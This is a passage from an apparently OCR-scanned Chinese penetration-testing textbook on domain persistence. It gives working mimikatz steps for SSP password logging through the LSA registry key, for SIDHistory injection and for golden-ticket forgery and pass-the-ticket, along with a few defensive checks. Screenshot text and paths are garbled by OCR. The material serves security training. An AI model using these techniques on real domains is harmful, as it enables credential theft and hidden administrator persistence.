mimilib.dll添加到注册表中。使用这种方法，即使系统重启，也不会影响持久化的效果。
将mimikatz中的mimilib.dll复制到系统的C:WindowsSystem32目录下，如图8-54所示。
---
## Page 366
第8章权限维持分析及防御353
需要注意的是，DLL文件的位数应与操作系统的位数相同。
-LocalDidk(C:）-Wind
PENTEST`Administrator
Aal234564
PENTEST,OC$
图8-53获取明文密码
New lskder
Dat
Sniefit.d
11/21/2010 11:24.AM
D
图8-54将mimilib.dll 复制到 System32中
修改 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa/Security Packages 项，
加载新的DLL文件，如图8-55所示。
Securty Pad
RES_DWORD
REG_MUTI_S2
x00000001 (1)
iet
图8-55修改注册表项
系统重启后，如果DLL被成功加载，用户在登录时输人的账号和密码明文就会被记录在
C:WindowsSystem32kiwissp.log 中，如图 8-56所示。
---
## Page 367
354内网安全攻防：渗透测试实战指南
Systea02
 ksvisp.log - Notepad
PENTESTV
0a3c
图8-56记录密码明文
2.SSP维持域控制器权限的防御措施
• 检查 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa/Security Packages 项
中是否含有可疑的DLL文件。
·检查C：WindowsiSystem32\目录下是否有可疑的DLL文件。
·使用第三方工具检查LSA中是否有可疑的DLL文件。
8.3.3SIDHistory域后门
每个用户都有自已的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权
限。SIDHistory是在域迁移过程中需要使用的一个属性。
如果将A域中的域用户迁移到B域中，那么在B域中新建的用户的SID会随之改变，进面
在域迁移过程中保持域用户的访间权限，即如果迁移后用户的SID改变了，系统会将其原来的
SID添加到迁移后用户的SIDHistory属性中，使迁移后的用户保持原有权限、能够访问其原来可
以访问的资源。使用mimikatz，可以将SID History属性添加到域中任意用户的 SID History属性
中。在渗透测试中，如果获得了域管理员权限（或者等同于域管理员的权限），就可以将SIDHistory
作为实现持久化的方法。
1.实验操作
将Administrator 的 SID 添加到恶意用户 test 的 SID History 属性中。使用 PowerShell查看 test
用户的SIDHistory属性，如图8-57所示。
打开一个具有域管理员权限的命令行窗口，然后打开mimikatz，将Administrator的SID添加
到test用户的SID History属性中，如图8-58所示。需要注意的是：在使用mimikatz注人SID之
前，需要使用“sid:patch”命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID
History属性；mimikatz在2.1版本以后，将misc:addsid模块转移到了sid:add模块下。
再次使用PowerShell查看test用户的 SID History，如图8-59所示。
---
## Page 368
第8章权限维持分析及防御355
test
Lest
8498SB9f 4ee5be1c ce4ef 4f9d763
IcerPrinc ipa 1Nan
图 8-57test 用户的 SID History 属性
iv ile
ninikatc # sid::add/sanitect/nev:adninistrator
Ntest,CNIlsers ,DC-pente≤t ,DC=con
ntNsne: test
图8-58将高权限的 SID添加到 test用户的 SID History属性中
S C:dn.PENTEST>ipconf ig /a11
Windous 1P Conf igurat ion
Host Nar
UIN-H0C70E28RS
Search List.
No
test,cc
图8-65查询域名
---
## Page 372
第8章权限维持分析及防御359
3.实验操作
在获取目标主机的权限后，查看当前用户及其所属的组，如图8-66所示。
Toir nane
Dn
lser's cor
actives
BB1 dir \Vdcc$
图8-67权限不足
（1）清空票据
在mimikatz中输入如下命令，如图8-68所示，当前会话中的票据已被清空。
kerberos::purge
图8-68清空票据
（2）生成票据
输人如下命令，使用mimikatz生成包含krbtgt身份的票据，如图8-69所示。
kerberos::golden /admin:Administrator /domain:pentest, com /sid:S-1-521-
3112629480-17516657954053538595 /krbtgt :a8f83dc6d427fbb1a42c4ab01840b659
/ticket :Administrator , kiribi
---
## Page 373
360内网安全攻防：渗透测试实战指南
2i-3k12g294ke-1e51615go14n535385nsadnibigtrato83dc6d42nipb1ae2e-cbns4ideS-1-5
Userin
ket:Adninistr
Adninistrator
or.kirihi
serId
ID
513 512522 58524ah18
F-18-15
PC generated
gene
Final Ticket Saved to file !
图8-69生成票据
命令执行后会提示保存成功。此时，会在本地目录下生成一个名为“Administrator.kiribi”的
文件。
（3）传递票据并注入内存
输入如下命令，将Administrator.kiribi票据注人内存，如图8-70所示。
kerberos::ptt Administrator,kiribi
ninikatz I kerberos::ptt Adninistrator.kiribi
 File: *Adninistrator.kiribi': OK
图8-70将票据注入内存
（4）检索当前会话中的票据
在mimikatz中输入如下命令，如图8-71所示，刚刚注入的票据就出现在当前会话中了。
kerberos::tgt
rt/End/MaxRenev: 9/18/2818 9:53:89 PH : 9/15/28289:53:B9 FM : 9/1
Client
Ticket
:Bxe817-rc4_hnac_nt
..1
：kuno -B
*a Session key is NULLt It neans alloutgtsessionkey is not set to 1 **
图8-71检索当前会话中的票据
4.验证权限
我们已经分析了将票据注入内存的过程。接下来，退出mimikatz，验证实验中伪造的身份是
否已经得到了域控制器权限。
---
## Page 374
第8章权限维持分析及防御361
在mimikatz中，输人“exit”命令退出。然后，在当前命令行窗口中输入命令“dir\dcicS”，